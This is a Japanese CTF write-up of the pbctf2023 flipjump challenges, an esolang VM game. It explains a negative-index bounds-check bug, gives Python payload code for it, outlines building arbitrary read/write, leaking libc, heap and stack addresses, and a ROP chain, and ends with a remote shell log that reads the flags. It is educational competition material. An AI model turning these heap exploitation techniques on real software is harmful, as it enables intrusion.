---
layout: page
title: "pbctf2023 flipjump 1, 1.5, 2"
date: 2023-02-21 00:00:00 -0000
---

flipjumpというesolang（https://esolangs.org/wiki/FlipJump）の問題です。

flipjumpはかなり簡単で、`p64((addr << 3) | bit) + p64(next)`という形で、フリップしたい１ビットを`addr`と`bit`で指定し、次の命令の位置を`next`で指定します。これだけです。1命令16バイトです。

この問題はただ命令を処理するだけでなく、謎のゲーム形式になっています。２つのプレイヤーがいて、それぞれのvm上でflipjumpをして、プレイヤー１にロードされた０から１５のランダムな数字を、プレイヤー２が当てると、ゲームをもう一度プレイできます。当てられないとその場でexitが走ります。プレイヤー１とプレイヤー２の間にはvm外で1ビットだけフリップできます。

## flipjump1 (misc)
実装ミスだったようで後に1.5が出ます。プレイヤー１のあと、戻り値が表示されていますので、その値をプレイヤー２で作り直すことができました。miscなので、これを所定の回数繰り返すとフラグが得られます。

## flipjump1.5 (misc)
上記のテクニックは相対アドレスのAARになっているので、これを利用してpwnのflipjump2を触っていたところ、リモートでリークが来ないぞ？→どうやら修正が来ているらしい→その修正は2も来ているらしいとなり、泣きながら再ダウンロードします。

修正後の流れは、プレイヤー１、プレイヤー２、そのあとに戻り値の表示となるので、プレイヤー２はランダム値を当てないといけません。

入力するコードサイズが256より小さいと、変なオーバーフローが起こるので、これを使ってどうにか戻り値が固定になるようにしようとしたり、ランダム値を持つ行を`next`に指定して、ジャンプテーブルで受けるという実装を作ったりしましたが、肝心のランダム値に関する値をプレイヤー２に残すことができずに終わりました。

vm外1ビットフリップ、謎のオーバーフロー、miscであることなどに引きずられ視界から外れていましたが、バグは範囲チェックにいました。

`param_1[1]`はコードサイズにあたりますが、`lVar1_next_index`の最大値の比較が不適切で、負の値が入ります。この問題はこれだけで全部解けます。

```c
    if ((lVar1_next_index < 0) || (param_1[1] <= lVar1_next_index * 2 + 1)) {
      exit(1);
    }
    *(int *)(param_1 + 2) = (int)lVar1_next_index;
```

今回のheapでは、プレイヤー２の隣接上側はプレイヤー１の領域があります。ランダム値もこれでアクセスできるので、後はそこを`next_index`に指定して、飛び先に合わせて値を作り直してあげればよいです。

具体的に、例えばプレイヤー１のランダム値が３だったら、飛び先でプレイヤー２の戻り値を３にするようにflipjumpのコードをセットします。

これにはindexの0から15には、それぞれ処理するアドレスに飛ぶジャンプテーブルを用意して、後ろ側で値を作り直してあげればよいでしょう。vm起動時にはいきなりマイナス方向に飛べないので、一旦後ろの方にジャンプして、index 0を修正してマイナス方向に飛ぶloader部と、リターンアドレスに値を追加することでAARになることが分かっていたので、これを付け加えるfinal部を付け加えて作っておきます。

```python
size = 0x1000                   
loader = 0xc00
final = 0xe00
target = 0xef0
p1ret = 0x7fffffffffffffec
waste = target-1 # garbage flips

def fj(flip_byte, flip_bit, next_idx):
    return flat( flip_byte << 3 | flip_bit, next_idx )

payload = b''
payload += fj(waste, 1, loader >> 4) # will be rewrite to fj(waste, 1, 0x10) by loader

# jump tables except #0
for i in range(1, 0x10):
    payload += fj( waste, 1, 0x10 + i * 0x9)

# re-construct each value [ex. jump from #3 table --> return 3]
# p2ret addr is target + 8
for i in range(0x10):
    for j in range(8):
        if (i >> j) & 1 == 1:
            payload += fj( target+8, j, 0x10 + i * 0x9 + (j+1)*0x1)
        else:
            payload += fj( waste, 0, 0x10 + i * 0x9 + (j+1)*0x1)
    payload += fj( waste, 0, final>>4)
assert(len(payload) < (loader))

# loader: fix table #0 and jump to the value p1ret 
payload = payload.ljust(loader, b'b')
payload += fj(8, 6, (loader>>4) + 0x1) # 0xc0 --> 0x80
payload += fj(8, 7, (loader>>4) + 0x2) # 0x80 --> 0x00
payload += fj(8, 4, p1ret) # 0x00 --> 0x10

# final: do something if you need after reconstruct p1ret
payload = payload.ljust(final, b'c')
#payload += fj(target+0x9, 2, final>>4 + 0x1)
#payload += fj(size-1, 0, final>>4 + 0x2)
payload += fj(size, 0, 0) # this will escape from vm 

payload = payload.ljust(target, b'd')

# keep p2ret clean
payload += fj(target, 0, 0)
payload = payload.ljust(size, b'e')
```

このコードで、loader部に飛んで、index0を直してランダム値に飛んで、ランダム値がnext_indexとなってジャンプテーブルに飛んで、そこから値を再構築するところに飛び、最後にfinal部を通ってうまく作成してくれます。愚直に所定回数やればよいです。

```python
for i in range(0x45):
    r.sendafter(b'length:\n', p64(0x410))
    r.sendafter(b'code:\n', b'a'*0x300+flat(0xee8<<3, 0xbeef) + b'b'*0x100)
    r.sendafter(b'length:\n', p64(size))
    r.sendafter(b'code:\n', payload)
    print(r.sendafter(b'Play again? (Y/N)\n', b'Y'))
```

## flipjump 2
ここではループとvm外フリップを利用してAAR/AAWを構築する必要があります。なので前提として1.5を解けることが必要です。vm外フリップは、プレイヤー１の戻り値に従って動きます。

プレイヤー１の戻り値は、デフォルトはランダム値がセットされ、プレイヤー１のvmが終了した後、`(addr << 3) | bit`として解釈され、該当のビットが反転されます。問題なのは、デフォルトでランダム値なので、ビットの部分がランダムになることです。特にAARは読めるまで待てばよいですが、AAWは、狙って書くのが恐ろしく低い確率になりそうなので、任意に指定できるように変えていきます。

ループを続けるためには元のランダム値は残しておかないといけませんので、近くにコピーし、戻り値のランダム値は消し、任意の値を戻り値にするように書き込みます。

任意の値を入れるためには8*6ビットで48命令は必要で、これはサイズにすると0x300となり、コード構成の都合上何かを小さくする必要がありました。再構築用の部分が愚直に`16 x 8`で0x800使っているので、これを縮めることを考えます。いろいろ解決策がありそうですが、全部まとめて処理しようと考えました。

要するにまず15から飛んで来たら15にしたいので、4ビットフリップします。

```
# Label 0xf
fj(target, 0, next)
fj(target, 1, next)
fj(target, 2, next)
fj(target, 3, next)
```

次に14から来たら14にしたいので、1ビットフリップします。

```
# Label 0xe
fj(target, 0, next)
# Label 0xf
fj(target, 0, next)
fj(target, 1, next)
fj(target, 2, next)
fj(target, 3, next)
```

次は13です。同じように考えます。

```
# Label 0xd
fj(target, 0, next)
fj(target, 1, next)
# Label 0xe
fj(target, 0, next)
# Label 0xf
fj(target, 0, next)
fj(target, 1, next)
fj(target, 2, next)
fj(target, 3, next)
```

この調子で0まで行くと、テーブルサイズは0x800から0x1d0にまで落ちます。これなら大丈夫そうです。

後は、再構築テーブルにランダム値を消すコードを加えて、final部に任意の値を書くところを追加すれば、AAR/Wが完成します。

exploitパートはかなり単純で、適当にlargebinを作った後は、libc、heap、environをリークして、今回はコントロール可能なmainからのreturnがあるので、ropをおいてそこに飛びます。このAARは読み先を破壊するので、environについては戻す必要がありました。

コードは[こちら](https://github.com/jt00000/ctf.writeup/blob/master/pbctf2023/flipjump/solve.py)

```
[+] Opening connection to flipjump2.chal.perfect.blue on port 1337: Done
    -> base: 0x7fb057939000
    -> heap: 0x556b24656000
    -> stack: 0x7ffe4abacb08
    -> rop_addr: 0x7ffe4abac9e8
[*] Switching to interactive mode
$ ls
flag1
flag2
flipjump
$ cat flag*
pbctf{you_went_ham_peko_81d5f1b3}
pbctf{you_are_a_certified_flip_jumper_de_gozaru}
```

範囲チェックは結構してたんですが、ほかに分かりやすいバグがあるとそっちに目移りしてしまってダメですね。flipjumpのコードを考えるのがおもしろかったです。
